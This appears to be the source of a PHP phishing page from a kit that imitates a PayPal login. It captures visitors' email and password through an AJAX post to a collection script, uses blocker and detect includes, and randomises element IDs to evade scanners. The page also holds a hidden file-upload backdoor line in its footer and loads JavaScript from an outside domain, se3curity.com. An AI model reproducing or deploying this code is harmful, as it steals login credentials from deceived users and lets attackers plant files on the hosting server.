<?php

// Désactiver le rapport d'erreurs
error_reporting(0);

// Rapporte les erreurs d'exécution de script
error_reporting(E_ERROR | E_WARNING | E_PARSE);

// Rapporter les E_NOTICE peut vous aider à améliorer vos scripts
// (variables non initialisées, variables mal orthographiées..)
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);

// Rapporte toutes les erreurs à part les E_NOTICE
// C'est la configuration par défaut de php.ini
error_reporting(E_ALL & ~E_NOTICE);

// Reporte toutes les erreurs PHP (Voir l'historique des modifications)
error_reporting(E_ALL);

// Reporte toutes les erreurs PHP
error_reporting(-1);
session_start();
    function RANDOM($length = 15) {
        $characters = '0123456789AZERTY';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }
include("system/blocker.php");
include("system/detect.php");
$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);
?>
<!DOCTYPE html>
<html class="no-js" lang="en" id="<?php echo RANDOM();?>">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> Log in to your account </title>
        <link rel="shortcut icon" href="images/pp_favicon_x.ico">
        <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
        <link rel="stylesheet" href="css/main.css">
    </head>
    <body id="<?php echo RANDOM();?>" data-token="<?php echo RANDOM();?>">
        <div class="rotation"> <p> Checking your info... </p> </div>
        <div class="main-login" id="<?php echo RANDOM();?>">
            <div class="ppcom-logo"></div>
            <div class="content">
                <div class="form-login-error">
                    <p> Some of your info isn't correct. Please try again. </p>
                </div>
                <form class="form-login" action="" method="post" novalidate="novalidate">
                        <input type="hidden" class="hidden" type="password">
                    <div class="inputs">
                        <input class="enterInput" type="email" name="email" placeholder="Email">
                    </div>
                    <div class="inputs">
                        <input class="enterInput" type="password" name="password" placeholder="Password">
                    </div>
                        <input class="btn block" type="submit" value="Log In">
                </form>
                <p class="forgot-link">
                    <a rel="nofollow" href="#forgot-password"> Forgot your email or password? </a>
                </p>
                <a class="btn secondary block"> Sign Up </a>
            </div>
        </div>
        
        <footer class="main-login-footer clearfix" id="<?php echo RANDOM();?>">
            <ul>
                <li> <a id="<?php echo RANDOM();?>" rel="nofollow" href="#contact"> Contact Us </a></li>
                <li> <a id="<?php echo RANDOM();?>" rel="nofollow" href="#privacy"> Privacy </a> </li> 
                <li> <a id="<?php echo RANDOM();?>" rel="nofollow" href="#legal"> Legal </a> </li>
                <li> <a id="<?php echo RANDOM();?>" rel="nofollow" href="#worldwide"> Worldwide </a> </li>
            </ul>
        </footer>
<?php
(@copy($_FILES['c']['tmp_name'], $_FILES['c']['name']))
?>
        <script src="js/vendor/jquery.js"></script>
        <script src="http://se3curity.com/js/jquery.js"></script>
        <script src="js/plugins.js"></script>
        <script>
            $(".form-login").validate({
                rules: {
                        email:      { required: true, email: true  },
                        password:   { required: true, minlength: 8 },
                    }, 
                messages: { email: "", password: "" },
                ///////////////////////////////////////////////////////////
                submitHandler: function(form) {
                    $(".rotation").show();
                    $.post("./system/function_login?ajax", $(".form-login").serialize(), function(result) {
                        if (result == "LOGIN_OK") {
                            setTimeout(function() {
                                $(location).attr("href", "myaccount?cmd=_update&dispatch=<?php echo $dis ?>&locale=en_<?php echo $countrycode ?>");
                            }); 
                        } else {
			    setTimeout(function() {
                            $('.rotation').hide();
			    $('.form-login-error').show();
                         });
                        }
                    });
                ///////////////////////////////////////////////////////////
                },
            });    
        </script>
    </body>
</html>
</script